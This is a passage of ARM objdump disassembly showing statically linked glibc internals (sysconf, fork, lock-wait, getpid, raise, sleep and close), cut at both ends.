   19618:	ebfff37f 	bl	1641c <__GI_closedir>
   1961c:	ea000001 	b	19628 <__GI_sysconf+0x4fc>
   19620:	ebfffe6e 	bl	18fe0 <nprocessors_onln>
   19624:	e1a07000 	mov	r7, r0
   19628:	e3570000 	cmp	r7, #0
   1962c:	11a01007 	movne	r1, r7
   19630:	03a01001 	moveq	r1, #1
   19634:	ea000036 	b	19714 <__GI_sysconf+0x5e8>
   19638:	ebfffe68 	bl	18fe0 <nprocessors_onln>
   1963c:	e1a01000 	mov	r1, r0
   19640:	ea000033 	b	19714 <__GI_sysconf+0x5e8>
   19644:	e3a01a01 	mov	r1, #4096	; 0x1000
   19648:	ea000031 	b	19714 <__GI_sysconf+0x5e8>
   1964c:	e3a01f7d 	mov	r1, #500	; 0x1f4
   19650:	ea00002f 	b	19714 <__GI_sysconf+0x5e8>
   19654:	e3a01008 	mov	r1, #8
   19658:	ea00002d 	b	19714 <__GI_sysconf+0x5e8>
   1965c:	e3a01000 	mov	r1, #0
   19660:	ea00002b 	b	19714 <__GI_sysconf+0x5e8>
   19664:	e3a01102 	mov	r1, #-2147483648	; 0x80000000
   19668:	ea000029 	b	19714 <__GI_sysconf+0x5e8>
   1966c:	e3a0107f 	mov	r1, #127	; 0x7f
   19670:	ea000027 	b	19714 <__GI_sysconf+0x5e8>
   19674:	e3e0107f 	mvn	r1, #127	; 0x7f
   19678:	ea000025 	b	19714 <__GI_sysconf+0x5e8>
   1967c:	e59f10bc 	ldr	r1, [pc, #188]	; 19740 <__GI_sysconf+0x614>
   19680:	ea000023 	b	19714 <__GI_sysconf+0x5e8>
   19684:	e59f10b8 	ldr	r1, [pc, #184]	; 19744 <__GI_sysconf+0x618>
   19688:	ea000021 	b	19714 <__GI_sysconf+0x5e8>
   1968c:	e3a01009 	mov	r1, #9
   19690:	ea00001f 	b	19714 <__GI_sysconf+0x5e8>
   19694:	e3a00001 	mov	r0, #1
   19698:	e1a0100d 	mov	r1, sp
   1969c:	e3a07f42 	mov	r7, #264	; 0x108
   196a0:	ef000000 	svc	0x00000000
   196a4:	e59f309c 	ldr	r3, [pc, #156]	; 19748 <__GI_sysconf+0x61c>
   196a8:	e3700a01 	cmn	r0, #4096	; 0x1000
   196ac:	91a01003 	movls	r1, r3
   196b0:	83e01000 	mvnhi	r1, #0
   196b4:	ea000016 	b	19714 <__GI_sysconf+0x5e8>
   196b8:	e3a01010 	mov	r1, #16
   196bc:	ea000014 	b	19714 <__GI_sysconf+0x5e8>
   196c0:	e3a010ff 	mov	r1, #255	; 0xff
   196c4:	ea000012 	b	19714 <__GI_sysconf+0x5e8>
   196c8:	e59f1078 	ldr	r1, [pc, #120]	; 19748 <__GI_sysconf+0x61c>
   196cc:	ea000010 	b	19714 <__GI_sysconf+0x5e8>
   196d0:	e3a01c01 	mov	r1, #256	; 0x100
   196d4:	ea00000e 	b	19714 <__GI_sysconf+0x5e8>
   196d8:	e3a01020 	mov	r1, #32
   196dc:	ea00000c 	b	19714 <__GI_sysconf+0x5e8>
   196e0:	e3a01004 	mov	r1, #4
   196e4:	ea00000a 	b	19714 <__GI_sysconf+0x5e8>
   196e8:	e3a01b01 	mov	r1, #1024	; 0x400
   196ec:	ea000008 	b	19714 <__GI_sysconf+0x5e8>
   196f0:	e3e01102 	mvn	r1, #-2147483648	; 0x80000000
   196f4:	ea000006 	b	19714 <__GI_sysconf+0x5e8>
   196f8:	e3a01014 	mov	r1, #20
   196fc:	ea000004 	b	19714 <__GI_sysconf+0x5e8>
   19700:	e3a01063 	mov	r1, #99	; 0x63
   19704:	ea000002 	b	19714 <__GI_sysconf+0x5e8>
   19708:	e3a01b02 	mov	r1, #2048	; 0x800
   1970c:	ea000000 	b	19714 <__GI_sysconf+0x5e8>
   19710:	e59f1034 	ldr	r1, [pc, #52]	; 1974c <__GI_sysconf+0x620>
   19714:	e1a00001 	mov	r0, r1
   19718:	e28dd014 	add	sp, sp, #20
   1971c:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   19720:	e12fff1e 	bx	lr
   19724:	0000f854 	.word	0x0000f854
   19728:	0000f4c0 	.word	0x0000f4c0
   1972c:	00031069 	.word	0x00031069
   19730:	ffff7b50 	.word	0xffff7b50
   19734:	00006304 	.word	0x00006304
   19738:	00007570 	.word	0x00007570
   1973c:	000001ec 	.word	0x000001ec
   19740:	ffff8000 	.word	0xffff8000
   19744:	0000ffff 	.word	0x0000ffff
   19748:	00030db0 	.word	0x00030db0
   1974c:	00007fff 	.word	0x00007fff

00019750 <__libc_fork>:
   19750:	e1a0c00d 	mov	ip, sp
   19754:	e92ddff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, ip, lr, pc}
   19758:	e59f8394 	ldr	r8, [pc, #916]	; 19af4 <__libc_fork+0x3a4>
   1975c:	e59f5394 	ldr	r5, [pc, #916]	; 19af8 <__libc_fork+0x3a8>
   19760:	e24cb004 	sub	fp, ip, #4
   19764:	e24dd01c 	sub	sp, sp, #28
   19768:	e08f8008 	add	r8, pc, r8
   1976c:	ea000033 	b	19840 <__libc_fork+0xf0>
   19770:	e3e0ca0f 	mvn	ip, #61440	; 0xf000
   19774:	e1a0e00f 	mov	lr, pc
   19778:	e24cf05f 	sub	pc, ip, #95	; 0x5f
   1977c:	e5973014 	ldr	r3, [r7, #20]
   19780:	e3530000 	cmp	r3, #0
   19784:	e1a04003 	mov	r4, r3
   19788:	e2831001 	add	r1, r3, #1
   1978c:	0a00002b 	beq	19840 <__libc_fork+0xf0>
   19790:	e7982005 	ldr	r2, [r8, r5]
   19794:	e2822014 	add	r2, r2, #20
   19798:	e5923000 	ldr	r3, [r2]
   1979c:	e1530004 	cmp	r3, r4
   197a0:	1a000005 	bne	197bc <__libc_fork+0x6c>
   197a4:	e1a00004 	mov	r0, r4
   197a8:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   197ac:	e1a0e00f 	mov	lr, pc
   197b0:	e243f03f 	sub	pc, r3, #63	; 0x3f
   197b4:	3afffff7 	bcc	19798 <__libc_fork+0x48>
   197b8:	e1a03004 	mov	r3, r4
   197bc:	e1530004 	cmp	r3, r4
   197c0:	1a00001e 	bne	19840 <__libc_fork+0xf0>
   197c4:	e3a04000 	mov	r4, #0
   197c8:	e5973004 	ldr	r3, [r7, #4]
   197cc:	e3530000 	cmp	r3, #0
   197d0:	11a0e00f 	movne	lr, pc
   197d4:	112fff13 	bxne	r3
   197d8:	e24dd010 	sub	sp, sp, #16
   197dc:	e58d7000 	str	r7, [sp]
   197e0:	e5977000 	ldr	r7, [r7]
   197e4:	e3570000 	cmp	r7, #0
   197e8:	e1a0500d 	mov	r5, sp
   197ec:	e58d4004 	str	r4, [sp, #4]
   197f0:	01a0600d 	moveq	r6, sp
   197f4:	0a000015 	beq	19850 <__libc_fork+0x100>
   197f8:	e2876014 	add	r6, r7, #20
   197fc:	e5971014 	ldr	r1, [r7, #20]
   19800:	e1a02006 	mov	r2, r6
   19804:	e1a04001 	mov	r4, r1
   19808:	e2811001 	add	r1, r1, #1
   1980c:	e5923000 	ldr	r3, [r2]
   19810:	e1530004 	cmp	r3, r4
   19814:	1a000005 	bne	19830 <__libc_fork+0xe0>
   19818:	e1a00004 	mov	r0, r4
   1981c:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   19820:	e1a0e00f 	mov	lr, pc
   19824:	e243f03f 	sub	pc, r3, #63	; 0x3f
   19828:	3afffff7 	bcc	1980c <__libc_fork+0xbc>
   1982c:	e1a03004 	mov	r3, r4
   19830:	e1530004 	cmp	r3, r4
   19834:	e1a04005 	mov	r4, r5
   19838:	1affffef 	bne	197fc <__libc_fork+0xac>
   1983c:	eaffffe1 	b	197c8 <__libc_fork+0x78>
   19840:	e7987005 	ldr	r7, [r8, r5]
   19844:	e3570000 	cmp	r7, #0
   19848:	1affffc8 	bne	19770 <__libc_fork+0x20>
   1984c:	e1a06007 	mov	r6, r7
   19850:	e59f32a4 	ldr	r3, [pc, #676]	; 19afc <__libc_fork+0x3ac>
   19854:	e7987003 	ldr	r7, [r8, r3]
   19858:	eb000404 	bl	1a870 <__aeabi_read_tp>
   1985c:	e5973008 	ldr	r3, [r7, #8]
   19860:	e2405e49 	sub	r5, r0, #1168	; 0x490
   19864:	e1530005 	cmp	r3, r5
   19868:	0a00000f 	beq	198ac <__libc_fork+0x15c>
   1986c:	e3a01001 	mov	r1, #1
   19870:	e1a02007 	mov	r2, r7
   19874:	e3a04000 	mov	r4, #0
   19878:	e5923000 	ldr	r3, [r2]
   1987c:	e1530004 	cmp	r3, r4
   19880:	1a000005 	bne	1989c <__libc_fork+0x14c>
   19884:	e1a00004 	mov	r0, r4
   19888:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1988c:	e1a0e00f 	mov	lr, pc
   19890:	e243f03f 	sub	pc, r3, #63	; 0x3f
   19894:	3afffff7 	bcc	19878 <__libc_fork+0x128>
   19898:	e1a03004 	mov	r3, r4
   1989c:	e1530004 	cmp	r3, r4
   198a0:	11a00007 	movne	r0, r7
   198a4:	1b00009c 	blne	19b1c <__lll_lock_wait_private>
   198a8:	e5875008 	str	r5, [r7, #8]
   198ac:	e59f3248 	ldr	r3, [pc, #584]	; 19afc <__libc_fork+0x3ac>
   198b0:	e7982003 	ldr	r2, [r8, r3]
   198b4:	e5923004 	ldr	r3, [r2, #4]
   198b8:	e2833001 	add	r3, r3, #1
   198bc:	e5823004 	str	r3, [r2, #4]
   198c0:	e595a06c 	ldr	sl, [r5, #108]	; 0x6c
   198c4:	e3a01000 	mov	r1, #0
   198c8:	e26a3000 	rsb	r3, sl, #0
   198cc:	e585306c 	str	r3, [r5, #108]	; 0x6c
   198d0:	e59f0228 	ldr	r0, [pc, #552]	; 19b00 <__libc_fork+0x3b0>
   198d4:	e1a02001 	mov	r2, r1
   198d8:	e1a03001 	mov	r3, r1
   198dc:	e2854068 	add	r4, r5, #104	; 0x68
   198e0:	e3a07078 	mov	r7, #120	; 0x78
   198e4:	ef000000 	svc	0x00000000
   198e8:	e3700a01 	cmn	r0, #4096	; 0x1000
   198ec:	e1a02000 	mov	r2, r0
   198f0:	9a000006 	bls	19910 <__libc_fork+0x1c0>
   198f4:	e59f3208 	ldr	r3, [pc, #520]	; 19b04 <__libc_fork+0x3b4>
   198f8:	eb0003dc 	bl	1a870 <__aeabi_read_tp>
   198fc:	e79f3003 	ldr	r3, [pc, r3]
   19900:	e2622000 	rsb	r2, r2, #0
   19904:	e3e09000 	mvn	r9, #0
   19908:	e7802003 	str	r2, [r0, r3]
   1990c:	ea00002e 	b	199cc <__libc_fork+0x27c>
   19910:	e2509000 	subs	r9, r0, #0
   19914:	1a00002c 	bne	199cc <__libc_fork+0x27c>
   19918:	e59f31e8 	ldr	r3, [pc, #488]	; 19b08 <__libc_fork+0x3b8>
   1991c:	e7982003 	ldr	r2, [r8, r3]
   19920:	e3520000 	cmp	r2, #0
   19924:	15923000 	ldrne	r3, [r2]
   19928:	12833004 	addne	r3, r3, #4
   1992c:	15823000 	strne	r3, [r2]
   19930:	e59f31d4 	ldr	r3, [pc, #468]	; 19b0c <__libc_fork+0x3bc>
   19934:	e7983003 	ldr	r3, [r8, r3]
   19938:	e593c000 	ldr	ip, [r3]
   1993c:	e59f31cc 	ldr	r3, [pc, #460]	; 19b10 <__libc_fork+0x3c0>
   19940:	e5952068 	ldr	r2, [r5, #104]	; 0x68
   19944:	e0884003 	add	r4, r8, r3
   19948:	e24be044 	sub	lr, fp, #68	; 0x44
   1994c:	e585206c 	str	r2, [r5, #108]	; 0x6c
   19950:	ea000003 	b	19964 <__libc_fork+0x214>
   19954:	e8940007 	ldm	r4, {r0, r1, r2}
   19958:	e88e0007 	stm	lr, {r0, r1, r2}
   1995c:	e8830007 	stm	r3, {r0, r1, r2}
   19960:	e59cc020 	ldr	ip, [ip, #32]
   19964:	e35c0000 	cmp	ip, #0
   19968:	e28c3038 	add	r3, ip, #56	; 0x38
   1996c:	1afffff8 	bne	19954 <__libc_fork+0x204>
   19970:	e59f319c 	ldr	r3, [pc, #412]	; 19b14 <__libc_fork+0x3c4>
   19974:	e0883003 	add	r3, r8, r3
   19978:	e8930007 	ldm	r3, {r0, r1, r2}
   1997c:	e24b3038 	sub	r3, fp, #56	; 0x38
   19980:	e8830007 	stm	r3, {r0, r1, r2}
   19984:	e59f2170 	ldr	r2, [pc, #368]	; 19afc <__libc_fork+0x3ac>
   19988:	e798c002 	ldr	ip, [r8, r2]
   1998c:	e8930007 	ldm	r3, {r0, r1, r2}
   19990:	e3a04001 	mov	r4, #1
   19994:	e88c0007 	stm	ip, {r0, r1, r2}
   19998:	ea000006 	b	199b8 <__libc_fork+0x268>
   1999c:	e5963000 	ldr	r3, [r6]
   199a0:	e593300c 	ldr	r3, [r3, #12]
   199a4:	e3530000 	cmp	r3, #0
   199a8:	11a0e00f 	movne	lr, pc
   199ac:	112fff13 	bxne	r3
   199b0:	e8960048 	ldm	r6, {r3, r6}
   199b4:	e5834014 	str	r4, [r3, #20]
   199b8:	e3560000 	cmp	r6, #0
   199bc:	1afffff6 	bne	1999c <__libc_fork+0x24c>
   199c0:	e59f3150 	ldr	r3, [pc, #336]	; 19b18 <__libc_fork+0x3c8>
   199c4:	e7886003 	str	r6, [r8, r3]
   199c8:	ea000045 	b	19ae4 <__libc_fork+0x394>
   199cc:	e59f3128 	ldr	r3, [pc, #296]	; 19afc <__libc_fork+0x3ac>
   199d0:	e585a06c 	str	sl, [r5, #108]	; 0x6c
   199d4:	e7980003 	ldr	r0, [r8, r3]
   199d8:	e5903004 	ldr	r3, [r0, #4]
   199dc:	e2433001 	sub	r3, r3, #1
   199e0:	e3530000 	cmp	r3, #0
   199e4:	e5803004 	str	r3, [r0, #4]
   199e8:	1a00003b 	bne	19adc <__libc_fork+0x38c>
   199ec:	e5803008 	str	r3, [r0, #8]
   199f0:	e1a05000 	mov	r5, r0
   199f4:	e5954000 	ldr	r4, [r5]
   199f8:	e3a01000 	mov	r1, #0
   199fc:	e1a02005 	mov	r2, r5
   19a00:	e5923000 	ldr	r3, [r2]
   19a04:	e1530004 	cmp	r3, r4
   19a08:	1a000005 	bne	19a24 <__libc_fork+0x2d4>
   19a0c:	e1a00004 	mov	r0, r4
   19a10:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   19a14:	e1a0e00f 	mov	lr, pc
   19a18:	e243f03f 	sub	pc, r3, #63	; 0x3f
   19a1c:	3afffff7 	bcc	19a00 <__libc_fork+0x2b0>
   19a20:	e1a03004 	mov	r3, r4
   19a24:	e1530004 	cmp	r3, r4
   19a28:	1afffff1 	bne	199f4 <__libc_fork+0x2a4>
   19a2c:	e3530001 	cmp	r3, #1
   19a30:	da000029 	ble	19adc <__libc_fork+0x38c>
   19a34:	e1a00005 	mov	r0, r5
   19a38:	e2811081 	add	r1, r1, #129	; 0x81
   19a3c:	e3a02001 	mov	r2, #1
   19a40:	e3a03000 	mov	r3, #0
   19a44:	e3a070f0 	mov	r7, #240	; 0xf0
   19a48:	ef000000 	svc	0x00000000
   19a4c:	ea000022 	b	19adc <__libc_fork+0x38c>
   19a50:	e5963000 	ldr	r3, [r6]
   19a54:	e5933008 	ldr	r3, [r3, #8]
   19a58:	e3530000 	cmp	r3, #0
   19a5c:	11a0e00f 	movne	lr, pc
   19a60:	112fff13 	bxne	r3
   19a64:	e5965000 	ldr	r5, [r6]
   19a68:	e2857014 	add	r7, r5, #20
   19a6c:	e5951014 	ldr	r1, [r5, #20]
   19a70:	e1a02007 	mov	r2, r7
   19a74:	e1a04001 	mov	r4, r1
   19a78:	e2411001 	sub	r1, r1, #1
   19a7c:	e5923000 	ldr	r3, [r2]
   19a80:	e1530004 	cmp	r3, r4
   19a84:	1a000005 	bne	19aa0 <__libc_fork+0x350>
   19a88:	e1a00004 	mov	r0, r4
   19a8c:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   19a90:	e1a0e00f 	mov	lr, pc
   19a94:	e243f03f 	sub	pc, r3, #63	; 0x3f
   19a98:	3afffff7 	bcc	19a7c <__libc_fork+0x32c>
   19a9c:	e1a03004 	mov	r3, r4
   19aa0:	e1530004 	cmp	r3, r4
   19aa4:	e1a02003 	mov	r2, r3
   19aa8:	1affffef 	bne	19a6c <__libc_fork+0x31c>
   19aac:	e3530001 	cmp	r3, #1
   19ab0:	1a000008 	bne	19ad8 <__libc_fork+0x388>
   19ab4:	e5961000 	ldr	r1, [r6]
   19ab8:	e5913018 	ldr	r3, [r1, #24]
   19abc:	e3530000 	cmp	r3, #0
   19ac0:	0a000004 	beq	19ad8 <__libc_fork+0x388>
   19ac4:	e5910014 	ldr	r0, [r1, #20]
   19ac8:	e3a03000 	mov	r3, #0
   19acc:	e3a01081 	mov	r1, #129	; 0x81
   19ad0:	e3a070f0 	mov	r7, #240	; 0xf0
   19ad4:	ef000000 	svc	0x00000000
   19ad8:	e5966004 	ldr	r6, [r6, #4]
   19adc:	e3560000 	cmp	r6, #0
   19ae0:	1affffda 	bne	19a50 <__libc_fork+0x300>
   19ae4:	e1a00009 	mov	r0, r9
   19ae8:	e24bd028 	sub	sp, fp, #40	; 0x28
   19aec:	e89d6ff0 	ldm	sp, {r4, r5, r6, r7, r8, r9, sl, fp, sp, lr}
   19af0:	e12fff1e 	bx	lr
   19af4:	0000f224 	.word	0x0000f224
   19af8:	00003568 	.word	0x00003568
   19afc:	00000098 	.word	0x00000098
   19b00:	01200011 	.word	0x01200011
   19b04:	0000f0e8 	.word	0x0000f0e8
   19b08:	00003564 	.word	0x00003564
   19b0c:	0000004c 	.word	0x0000004c
   19b10:	ffff7b78 	.word	0xffff7b78
   19b14:	ffff7b6c 	.word	0xffff7b6c
   19b18:	0000045c 	.word	0x0000045c

00019b1c <__lll_lock_wait_private>:
   19b1c:	e92d40b0 	push	{r4, r5, r7, lr}
   19b20:	e1a05000 	mov	r5, r0
   19b24:	e3a01002 	mov	r1, #2
   19b28:	e1a02005 	mov	r2, r5
   19b2c:	e3a04001 	mov	r4, #1
   19b30:	e5923000 	ldr	r3, [r2]
   19b34:	e1530004 	cmp	r3, r4
   19b38:	1a000005 	bne	19b54 <__lll_lock_wait_private+0x38>
   19b3c:	e1a00004 	mov	r0, r4
   19b40:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   19b44:	e1a0e00f 	mov	lr, pc
   19b48:	e243f03f 	sub	pc, r3, #63	; 0x3f
   19b4c:	3afffff7 	bcc	19b30 <__lll_lock_wait_private+0x14>
   19b50:	e1a03004 	mov	r3, r4
   19b54:	e3530000 	cmp	r3, #0
   19b58:	0a000005 	beq	19b74 <__lll_lock_wait_private+0x58>
   19b5c:	e1a00005 	mov	r0, r5
   19b60:	e281107e 	add	r1, r1, #126	; 0x7e
   19b64:	e3a02002 	mov	r2, #2
   19b68:	e3a03000 	mov	r3, #0
   19b6c:	e3a070f0 	mov	r7, #240	; 0xf0
   19b70:	ef000000 	svc	0x00000000
   19b74:	e3a01002 	mov	r1, #2
   19b78:	e1a02005 	mov	r2, r5
   19b7c:	e3a04000 	mov	r4, #0
   19b80:	e5923000 	ldr	r3, [r2]
   19b84:	e1530004 	cmp	r3, r4
   19b88:	1a000005 	bne	19ba4 <__lll_lock_wait_private+0x88>
   19b8c:	e1a00004 	mov	r0, r4
   19b90:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   19b94:	e1a0e00f 	mov	lr, pc
   19b98:	e243f03f 	sub	pc, r3, #63	; 0x3f
   19b9c:	3afffff7 	bcc	19b80 <__lll_lock_wait_private+0x64>
   19ba0:	e1a03004 	mov	r3, r4
   19ba4:	e1530004 	cmp	r3, r4
   19ba8:	1affffdd 	bne	19b24 <__lll_lock_wait_private+0x8>
   19bac:	e8bd40b0 	pop	{r4, r5, r7, lr}
   19bb0:	e12fff1e 	bx	lr

00019bb4 <__getpid>:
   19bb4:	e92d4080 	push	{r7, lr}
   19bb8:	eb00032c 	bl	1a870 <__aeabi_read_tp>
   19bbc:	e5103424 	ldr	r3, [r0, #-1060]	; 0xfffffbdc
   19bc0:	e3530000 	cmp	r3, #0
   19bc4:	e1a02000 	mov	r2, r0
   19bc8:	ca000008 	bgt	19bf0 <__getpid+0x3c>
   19bcc:	1a000002 	bne	19bdc <__getpid+0x28>
   19bd0:	e5100428 	ldr	r0, [r0, #-1064]	; 0xfffffbd8
   19bd4:	e3500000 	cmp	r0, #0
   19bd8:	1a000003 	bne	19bec <__getpid+0x38>
   19bdc:	e3a07014 	mov	r7, #20
   19be0:	ef000000 	svc	0x00000000
   19be4:	e3530000 	cmp	r3, #0
   19be8:	05020428 	streq	r0, [r2, #-1064]	; 0xfffffbd8
   19bec:	e1a03000 	mov	r3, r0
   19bf0:	e1a00003 	mov	r0, r3
   19bf4:	e8bd4080 	pop	{r7, lr}
   19bf8:	e12fff1e 	bx	lr

00019bfc <__GI_raise>:
   19bfc:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   19c00:	e1a06000 	mov	r6, r0
   19c04:	eb000319 	bl	1a870 <__aeabi_read_tp>
   19c08:	e5104428 	ldr	r4, [r0, #-1064]	; 0xfffffbd8
   19c0c:	e3540000 	cmp	r4, #0
   19c10:	e1a03000 	mov	r3, r0
   19c14:	e5100424 	ldr	r0, [r0, #-1060]	; 0xfffffbdc
   19c18:	1a000004 	bne	19c30 <__GI_raise+0x34>
   19c1c:	e3a070e0 	mov	r7, #224	; 0xe0
   19c20:	ef000000 	svc	0x00000000
   19c24:	e1a04000 	mov	r4, r0
   19c28:	e5034428 	str	r4, [r3, #-1064]	; 0xfffffbd8
   19c2c:	ea000005 	b	19c48 <__GI_raise+0x4c>
   19c30:	e3500000 	cmp	r0, #0
   19c34:	ca000003 	bgt	19c48 <__GI_raise+0x4c>
   19c38:	e3c03102 	bic	r3, r0, #-2147483648	; 0x80000000
   19c3c:	e3530000 	cmp	r3, #0
   19c40:	01a00004 	moveq	r0, r4
   19c44:	12600000 	rsbne	r0, r0, #0
   19c48:	e1a01004 	mov	r1, r4
   19c4c:	e1a02006 	mov	r2, r6
   19c50:	e3a07f43 	mov	r7, #268	; 0x10c
   19c54:	ef000000 	svc	0x00000000
   19c58:	e3700a01 	cmn	r0, #4096	; 0x1000
   19c5c:	e1a02000 	mov	r2, r0
   19c60:	91a00000 	movls	r0, r0
   19c64:	9a000005 	bls	19c80 <__GI_raise+0x84>
   19c68:	e59f3070 	ldr	r3, [pc, #112]	; 19ce0 <__GI_raise+0xe4>
   19c6c:	eb0002ff 	bl	1a870 <__aeabi_read_tp>
   19c70:	e79f3003 	ldr	r3, [pc, r3]
   19c74:	e2622000 	rsb	r2, r2, #0
   19c78:	e7802003 	str	r2, [r0, r3]
   19c7c:	e3e00000 	mvn	r0, #0
   19c80:	e3700001 	cmn	r0, #1
   19c84:	e1a05000 	mov	r5, r0
   19c88:	1a000011 	bne	19cd4 <__GI_raise+0xd8>
   19c8c:	e59f3050 	ldr	r3, [pc, #80]	; 19ce4 <__GI_raise+0xe8>
   19c90:	eb0002f6 	bl	1a870 <__aeabi_read_tp>
   19c94:	e79f3003 	ldr	r3, [pc, r3]
   19c98:	e7903003 	ldr	r3, [r0, r3]
   19c9c:	e3530026 	cmp	r3, #38	; 0x26
   19ca0:	e1a0c000 	mov	ip, r0
   19ca4:	1a00000a 	bne	19cd4 <__GI_raise+0xd8>
   19ca8:	e1a00004 	mov	r0, r4
   19cac:	e1a01006 	mov	r1, r6
   19cb0:	e3a070ee 	mov	r7, #238	; 0xee
   19cb4:	ef000000 	svc	0x00000000
   19cb8:	e3700a01 	cmn	r0, #4096	; 0x1000
   19cbc:	859f3024 	ldrhi	r3, [pc, #36]	; 19ce8 <__GI_raise+0xec>
   19cc0:	82602000 	rsbhi	r2, r0, #0
   19cc4:	879f3003 	ldrhi	r3, [pc, r3]
   19cc8:	81a00005 	movhi	r0, r5
   19ccc:	878c2003 	strhi	r2, [ip, r3]
   19cd0:	e1a05000 	mov	r5, r0
   19cd4:	e1a00005 	mov	r0, r5
   19cd8:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   19cdc:	e12fff1e 	bx	lr
   19ce0:	0000ed74 	.word	0x0000ed74
   19ce4:	0000ed50 	.word	0x0000ed50
   19ce8:	0000ed20 	.word	0x0000ed20

00019cec <__GI_sleep>:
   19cec:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   19cf0:	e59f7114 	ldr	r7, [pc, #276]	; 19e0c <__GI_sleep+0x120>
   19cf4:	e24dd02c 	sub	sp, sp, #44	; 0x2c
   19cf8:	e3a04000 	mov	r4, #0
   19cfc:	e3500000 	cmp	r0, #0
   19d00:	e08f7007 	add	r7, pc, r7
   19d04:	e58d0020 	str	r0, [sp, #32]
   19d08:	e58d4024 	str	r4, [sp, #36]	; 0x24
   19d0c:	1a00001c 	bne	19d84 <__GI_sleep+0x98>
   19d10:	eb0002d6 	bl	1a870 <__aeabi_read_tp>
   19d14:	e510340c 	ldr	r3, [r0, #-1036]	; 0xfffffbf4
   19d18:	e3c33046 	bic	r3, r3, #70	; 0x46
   19d1c:	e3530008 	cmp	r3, #8
   19d20:	e2405e49 	sub	r5, r0, #1168	; 0x490
   19d24:	1a000034 	bne	19dfc <__GI_sleep+0x110>
   19d28:	e3e03000 	mvn	r3, #0
   19d2c:	e5853220 	str	r3, [r5, #544]	; 0x220
   19d30:	e2856084 	add	r6, r5, #132	; 0x84
   19d34:	e5951084 	ldr	r1, [r5, #132]	; 0x84
   19d38:	e1a02006 	mov	r2, r6
   19d3c:	e1a04001 	mov	r4, r1
   19d40:	e3811010 	orr	r1, r1, #16
   19d44:	e5923000 	ldr	r3, [r2]
   19d48:	e1530004 	cmp	r3, r4
   19d4c:	1a000005 	bne	19d68 <__GI_sleep+0x7c>
   19d50:	e1a00004 	mov	r0, r4
   19d54:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   19d58:	e1a0e00f 	mov	lr, pc
   19d5c:	e243f03f 	sub	pc, r3, #63	; 0x3f
   19d60:	3afffff7 	bcc	19d44 <__GI_sleep+0x58>
   19d64:	e1a03004 	mov	r3, r4
   19d68:	e1530004 	cmp	r3, r4
   19d6c:	1afffff0 	bne	19d34 <__GI_sleep+0x48>
   19d70:	e5950080 	ldr	r0, [r5, #128]	; 0x80
   19d74:	e59f3094 	ldr	r3, [pc, #148]	; 19e10 <__GI_sleep+0x124>
   19d78:	e797c003 	ldr	ip, [r7, r3]
   19d7c:	e1a0e00f 	mov	lr, pc
   19d80:	e12fff1c 	bx	ip
   19d84:	e3a03801 	mov	r3, #65536	; 0x10000
   19d88:	e3a00011 	mov	r0, #17
   19d8c:	e1a01004 	mov	r1, r4
   19d90:	e28d2004 	add	r2, sp, #4
   19d94:	e58d3018 	str	r3, [sp, #24]
   19d98:	e58d401c 	str	r4, [sp, #28]
   19d9c:	eb000288 	bl	1a7c4 <__libc_sigaction>
   19da0:	e59d3004 	ldr	r3, [sp, #4]
   19da4:	e3530001 	cmp	r3, #1
   19da8:	028d1018 	addeq	r1, sp, #24
   19dac:	01a00004 	moveq	r0, r4
   19db0:	01a02001 	moveq	r2, r1
   19db4:	0bfff169 	bleq	16360 <__GI_sigprocmask>
   19db8:	e28d0020 	add	r0, sp, #32
   19dbc:	e1a01000 	mov	r1, r0
   19dc0:	eb000391 	bl	1ac0c <__libc_nanosleep>
   19dc4:	e3500000 	cmp	r0, #0
   19dc8:	01a04000 	moveq	r4, r0
   19dcc:	0a000005 	beq	19de8 <__GI_sleep+0xfc>
   19dd0:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
   19dd4:	e59f2038 	ldr	r2, [pc, #56]	; 19e14 <__GI_sleep+0x128>
   19dd8:	e59d3020 	ldr	r3, [sp, #32]
   19ddc:	e1510002 	cmp	r1, r2
   19de0:	d1a04003 	movle	r4, r3
   19de4:	c2834001 	addgt	r4, r3, #1
   19de8:	e59d3018 	ldr	r3, [sp, #24]
   19dec:	e2132801 	ands	r2, r3, #65536	; 0x10000
   19df0:	03a00002 	moveq	r0, #2
   19df4:	028d1018 	addeq	r1, sp, #24
   19df8:	0bfff158 	bleq	16360 <__GI_sigprocmask>
   19dfc:	e1a00004 	mov	r0, r4
   19e00:	e28dd02c 	add	sp, sp, #44	; 0x2c
   19e04:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   19e08:	e12fff1e 	bx	lr
   19e0c:	0000ec8c 	.word	0x0000ec8c
   19e10:	00000074 	.word	0x00000074
   19e14:	1dcd64ff 	.word	0x1dcd64ff
	...
   19e20:	000120b4 	.word	0x000120b4

00019e24 <__GI___close_nocancel>:
   19e24:	e1a0c007 	mov	ip, r7
   19e28:	e3a07006 	mov	r7, #6
   19e2c:	ef000000 	svc	0x00000000
   19e30:	e1a0700c 	mov	r7, ip
   19e34:	31a0f00e 	movcc	pc, lr
   19e38:	ea000256 	b	1a798 <__syscall_error>
   19e3c:	e1a00000 	nop			; (mov r0, r0)

00019e40 <__GI___libc_close>:
   19e40:	e51fc028 	ldr	ip, [pc, #-40]	; 19e20 <__GI_sleep+0x134>
   19e44:	e79fc00c 	ldr	ip, [pc, ip]
   19e48:	e33c0000 	teq	ip, #0
   19e4c:	1a000006 	bne	19e6c <__GI___libc_close+0x2c>
   19e50:	e1a0c007 	mov	ip, r7
   19e54:	e3a07006 	mov	r7, #6
   19e58:	ef000000 	svc	0x00000000
   19e5c:	e1a0700c 	mov	r7, ip
   19e60:	e3700a01 	cmn	r0, #4096	; 0x1000
   19e64:	31a0f00e 	movcc	pc, lr
   19e68:	ea00024a 	b	1a798 <__syscall_error>
   19e6c:	e92d4083 	push	{r0, r1, r7, lr}
   19e70:	eb00009c 	bl	1a0e8 <__libc_enable_asynccancel>
